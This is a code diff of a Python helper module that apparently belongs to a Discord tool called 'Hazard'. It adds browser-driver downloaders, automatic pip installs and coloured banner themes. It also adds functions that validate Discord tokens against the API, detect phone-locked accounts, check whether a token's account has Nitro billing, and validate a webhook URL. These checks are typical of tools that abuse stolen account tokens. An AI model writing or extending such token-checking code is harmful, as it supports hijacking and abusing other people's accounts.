@@ -8,22 +8,25 @@ import io
 import sys
 import time
 import json
+import shutil
 import ctypes
 import random
 import zipfile
 import requests
-import pkg_resources
-import subprocess
 import threading
+import subprocess
 
-from distutils.version import LooseVersion
 from urllib.request import urlopen, urlretrieve
+from distutils.version import LooseVersion
 from bs4 import BeautifulSoup
 from colorama import Fore
 from time import sleep
 
-THIS_VERSION = "1.3.3" #1.4.1
-TARGET_VERSION = 0
+THIS_VERSION = "1.4.3"
+
+
+google_target_ver = 0
+edge_target_ver = 0
 
 class Chrome_Installer(object):
     installed = False
@@ -33,8 +36,8 @@ class Chrome_Installer(object):
     def __init__(self, executable_path=None, target_version=None, *args, **kwargs):
         self.platform = sys.platform
 
-        if TARGET_VERSION:
-            self.target_version = TARGET_VERSION
+        if google_target_ver:
+            self.target_version = google_target_ver
 
         if target_version:
             self.target_version = target_version
@@ -116,8 +119,8 @@ class Edge_Installer(object):
     def __init__(self, executable_path=None, target_version=None, *args, **kwargs):
         self.platform = sys.platform
 
-        if TARGET_VERSION:
-            self.target_version = TARGET_VERSION
+        if edge_target_ver:
+            self.target_version = edge_target_ver
 
         if target_version:
             self.target_version = target_version
@@ -191,7 +194,6 @@ class Edge_Installer(object):
         ver = self.get_release_version_number().vstring
         if os.path.exists(self.executable_path):
             return self.executable_path
-        print(f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip")
         urlretrieve(
             f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip",
             filename=zip_name,
@@ -203,21 +205,41 @@ class Edge_Installer(object):
             os.chmod(self._exe_name, 0o755)
         return self._exe_name
 
-#NOT FINISHED
 class Opera_Installer(object):
-    _os_bit = 64
+    DL_BASE = "https://github.com"
     def __init__(self, *args, **kwargs):
-        if os.environ.get('PROCESSOR_ARCHITECTURE').lower() == 'x86' and os.environ.get('PROCESSOR_ARCHITEW6432') is None: 
-            self.__class__._os_bit = 32
-            
-        r = requests.get("https://github.com/operasoftware/operachromiumdriver/releases")
-        soup = str(BeautifulSoup(r.text, 'html.parser'))
-        print(soup.get_text())
+        self.platform = sys.platform
+        self.links = ""
 
-def get_driver():
+        r = requests.get(self.__class__.DL_BASE+"/operasoftware/operachromiumdriver/releases")
+        soup = BeautifulSoup(r.text, 'html.parser')
+        for link in soup.find_all('a'):
+            if "operadriver" in link.get('href'):
+                self.links += f"{link.get('href')}\n"
+
+        for i in self.links.split("\n")[:4]:
+            if self.platform in i:
+                self.fetch_edgedriver(i)
+
+    def fetch_edgedriver(self, driver):
+        executable = "operadriver.exe"
+        driver_name = driver.split("/")[-1]
+        cwd = os.getcwd() + os.sep
+
+        urlretrieve(self.__class__.DL_BASE+driver, filename=driver_name)
+        with zipfile.ZipFile(driver_name) as zf:
+            zf.extractall()
+        shutil.move(cwd+driver_name[:-4]+os.sep+executable, cwd+executable)
+        os.remove(driver_name)
+        shutil.rmtree(driver_name[:-4])
+
+# class Error(Exception):
+#     '''Just for clearer errors'''
+#     pass
+
+def getDriver():
     #supported drivers
-    drivers = ["chromedriver.exe", "msedgedriver.exe"] #"operadriver.exe",
-
+    drivers = ["chromedriver.exe", "msedgedriver.exe", "operadriver.exe"]
     print(f"\n{Fore.BLUE}Checking Driver. . .")
     sleep(0.5)
 
@@ -234,10 +256,10 @@ def get_driver():
             Chrome_Installer()
             print(f"{Fore.GREEN}chromedriver.exe Installed!{Fore.RESET}")
             return "chromedriver.exe"
-        # elif os.path.exists(os.getenv('appdata') + '\\Opera Software\\Opera Stable'):
-            # Opera_Installer()
-            #print(f"{Fore.GREEN}operadriver.exe Installed!{Fore.RESET}")
-            # return "operadriver.exe"
+        elif os.path.exists(os.getenv('appdata') + '\\Opera Software\\Opera Stable'):
+            Opera_Installer()
+            print(f"{Fore.GREEN}operadriver.exe Installed!{Fore.RESET}")
+            return "operadriver.exe"
         elif os.path.exists(os.getenv('localappdata') + '\\Microsoft\\Edge'):
             Edge_Installer()
             print(f"{Fore.GREEN}msedgedriver.exe Installed!{Fore.RESET}")
@@ -245,7 +267,7 @@ def get_driver():
         else:
             print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : No compatible driver found. . . Proceeding with chromedriver')
             Chrome_Installer()
-            print(f"{Fore.GREEN}trying to install chromedriver.exe{Fore.RESET}")
+            print(f"{Fore.GREEN}trying with chromedriver.exe{Fore.RESET}")
             return "chromedriver.exe"
 
 def clear():
@@ -272,45 +294,82 @@ def setTitle(_str):
         #if its something else or some err happend for some reason, we do nothing
         pass
 
-def random_chinese(amount, second_amount):
+def RandomChinese(amount, second_amount):
     name = u''
     for i in range(random.randint(amount, second_amount)):
         name = name + chr(random.randint(0x4E00,0x8000))
     return name
 
-def print_slow(_str):
+def SlowPrint(_str):
     for letter in _str:
         #slowly print out the words 
         sys.stdout.write(letter);sys.stdout.flush();sleep(0.04)
 
-def install_lib(dependencies):
-    #check for missing libs
-    installed_packages = sorted([i.key for i in pkg_resources.working_set])
+def installPackage(dependencies):
+    #get all installed libs
+    process = subprocess.Popen(f"pip freeze", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+    installed_packages = process.communicate()[0].decode().replace("\n","")
     for lib in dependencies:
-        if lib not in installed_packages:
+        #check for missing libs 
+        if lib not in installed_packages.lower():
             #install the lib if it wasn't found
             print(f"{Fore.BLUE}{lib}{Fore.RED} not found! Installing it for you. . .{Fore.RESET}")
+            process = subprocess.Popen(f"where python", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
             try:
-                subprocess.check_call([sys.executable, '-m', 'pip', 'install', lib])
+                python = process.communicate()[0].decode().split()[0]
+                #if no python was found, or not installed
+            except (KeyError, IndexError):
+                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Python was not found or isn\'t installed on this device\n{Fore.YELLOW}Please install it here {Fore.RESET}-> {Fore.BLUE}https://www.python.org{Fore.RESET}')
+                sleep(2)
+                SlowPrint("Enter anything to continue. . . ")
+                input()
+                os._exit(0)
+            try:
+                if "microsoft" in python[0].lower(): python = python[1] #this can easily be improved but too lazy
+                if python == "": python = "python"
+                subprocess.check_call([python, '-m', 'pip', 'install', lib])
             #incase something goes wrong we notify the user that something happend
             except Exception as e:
                 print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : {e}')
                 sleep(0.5)
-                pass
+
+def hasNitroBoost(token):
+    '''return True if they got nitro boost and False if they don't'''
+    channelIds = requests.get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", headers=getheaders(token)).json()
+    try:
+        if channelIds[0]["type"] == 1:
+            return True
+    except Exception:
+        return False
 
 def validateToken(token):
+    '''validate the token by contacting the discord api'''
+    #define variables
+    base_url = "https://discord.com/api/v9/users/@me"
+    message = "You need to verify your account in order to perform this action."
     #contact discord api and see if you can get a valid response with the given token
-    r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
-    if r.status_code == 200:
-        #it is a valid token
-        pass
-    else:
-        #token is invalid
+    r = requests.get(base_url, headers=getheaders(token))
+    if r.status_code != 200:
+        #invalid token
         print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
         sleep(1)
         __import__("Hazard").main()
+    j = requests.get(f'{base_url}/billing/subscriptions', headers=getheaders(token)).json()
+    #check if the account is phone locked
+    try:
+        if j["message"] == message:
+            print(f"\n{Fore.RED}Phone Locked Token.{Fore.RESET}")
+            sleep(1)
+            __import__("Hazard").main()
+    except (KeyError, TypeError, IndexError):
+        pass
 
 def validateWebhook(hook):
+    #if the input is something like google.com or something else we check if it contains api/webhooks first
+    if not "api/webhooks" in hook:
+        print(f"\n{Fore.RED}Invalid Webhook.{Fore.RESET}")
+        sleep(1)
+        __import__("Hazard").main()
     try:
         #try and get a connection with the input
         responce = requests.get(hook)
@@ -466,71 +525,61 @@ def blackwhite(text):
                 red = 255; green = 255; blue = 255
     return faded
 
-def purplepink(text):
-    os.system(""); faded = ""
-    red = 40
-    for line in text.splitlines():
-        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
-        if not red == 255:
-            red += 15
-            if red > 255:
-                red = 255
-    return faded
-
-def greenblue(text):
-    os.system(""); faded = ""
+def cyan(text):
+    os.system(""); fade = ""
     blue = 100
     for line in text.splitlines():
-        faded += (f"\033[38;2;0;255;{blue}m{line}\033[0m\n")
+        fade += (f"\033[38;2;0;255;{blue}m{line}\033[0m\n")
         if not blue == 255:
             blue += 15
             if blue > 255:
                 blue = 255
-    return faded
+    return fade
 
-def pinkred(text):
-    os.system(""); faded = ""
-    blue = 255
+def neon(text):
+    os.system(""); fade = ""
     for line in text.splitlines():
-        faded += (f"\033[38;2;255;0;{blue}m{line}\033[0m\n")
-        if not blue == 0:
-            blue -= 20
-            if blue < 0:
-                blue = 0
-    return faded
+        red = 255
+        for char in line:
+            red -= 2
+            if red > 255:
+                red = 255
+            fade += (f"\033[38;2;{red};0;255m{char}\033[0m")
+        fade += "\n"
+    return fade
 
-def purpleblue(text):
-    os.system(""); faded = ""
-    red = 110
+def purple(text):
+    os.system(""); fade = "" 
+    red = 255
     for line in text.splitlines():
-        faded += (f"\033[38;2;{red};0;255m{line}\033[0m\n")
+        fade += (f"\033[38;2;{red};0;180m{line}\033[0m\n")
         if not red == 0:
-            red -= 15
+            red -= 20
             if red < 0:
                 red = 0
-    return faded
+    return fade
 
 def water(text):
-    os.system(""); faded = ""
+    os.system(""); fade = ""
     green = 10
     for line in text.splitlines():
-        faded += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
+        fade += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
         if not green == 255:
             green += 15
             if green > 255:
                 green = 255
-    return faded
+    return fade
 
 def fire(text):
-    os.system(""); faded = ""
+    os.system(""); fade = ""
     green = 250
     for line in text.splitlines():
-        faded += (f"\033[38;2;255;{green};0m{line}\033[0m\n")
+        fade += (f"\033[38;2;255;{green};0m{line}\033[0m\n")
         if not green == 0:
             green -= 25
             if green < 0:
                 green = 0
-    return faded
+    return fade
 ########################################################################################################################################################
 
 def getTheme():
@@ -555,9 +604,9 @@ def banner(theme=None):
     elif theme == "fire":
         print(bannerTheme(fire, fire))
     elif theme == "water":
-        print(bannerTheme(water, greenblue))
+        print(bannerTheme(water, cyan))
     elif theme == "neon":
-        print(bannerTheme(pinkred, purpleblue))
+        print(bannerTheme(purple, neon))
     else:
         print(f'''{Fore.GREEN}
                                                                                                          _   _
